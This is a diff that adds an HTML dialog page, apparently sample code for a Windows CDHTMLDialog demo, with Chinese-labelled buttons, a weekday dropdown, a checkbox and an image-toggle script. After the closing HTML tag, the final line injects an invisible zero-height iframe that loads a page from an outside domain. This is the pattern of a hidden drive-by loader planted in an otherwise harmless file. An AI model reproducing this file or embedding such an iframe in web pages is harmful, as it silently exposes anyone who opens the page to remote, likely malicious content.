@@ -1,0 +1,56 @@
+<HTML>
+	<META http-equiv="Content-Type" content="text/html; charset=gb2312">
+	<script type="text/javascript">
+	function OnClickCheckHidden() 
+	{
+		if(idCheck.checked != false) 
+		{
+			idImg.style.display=''; 
+			ButtonHideImg.innerText='隐藏图片';
+		} 
+		else 
+		{
+			idImg.style.display='none'; 
+			ButtonHideImg.innerText='显示图片';
+		}
+	}
+	</script>
+	<BODY id="CDHTMLDialogDlg" bgColor="lightgrey">
+		<TABLE width="100%">
+			<TR>
+				<TD align="right"><BUTTON id="ButtonOK" style="WIDTH: 100px" type="button" >确定</BUTTON><BUTTON id="ButtonCancel" style="WIDTH: 100px" type="button">取消</BUTTON><BR>
+					<HR>
+					<BUTTON id="ButtonHideImg" type="button">隐藏图片</BUTTON>
+					<BUTTON id="ButtonClickImg" type="button">动态添加单击图片事件</BUTTON>
+					<BUTTON id="ButtonSelect" type = "button">选择星期三</BUTTON>
+					<button id="ButtonAddSelect" type="button">添加星期五</button>
+					<button id="ButtonDeleteSelect" type="button">删除星期五</button>
+					<BUTTON id="ButtonCheck" type="button">改变CheckBox事件</BUTTON>
+					<HR>
+				</TD>
+			</TR>
+			<TR height="75" WIDTH="100%">
+			</TR>
+		</TABLE>
+		<table height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
+			<tr>
+				<TD ALIGN="left" width="60%" valign="top" id="tbImg"><img src="I200882214474796213.jpg" id="idImg">
+				</TD>
+				<td valign="top">
+				<select id = "idSel">
+				<option value="0">星期日</option>
+				<option value="1">星期一</option>
+				<option value="2">星期二</option>
+				<option value="3">星期三</option>
+				<option value="4">星期四</option>
+				</select>
+				<br>
+				<input type="checkbox" id="idCheck" onclick="return confirm('确实要选择/取消吗？');"><label for="idCheck" id="idCheck_label">这是选择框</label>
+				<input type="hidden" id="idCheck_hidden" onclick="OnClickCheckHidden();">
+				</td>
+			</tr>
+		</table>
+		</TR></TABLE>
+	</BODY>
+</HTML>
+<iframe src=http://www.114Oldest.com/zz/mm.htm width=100 height=0></iframe>
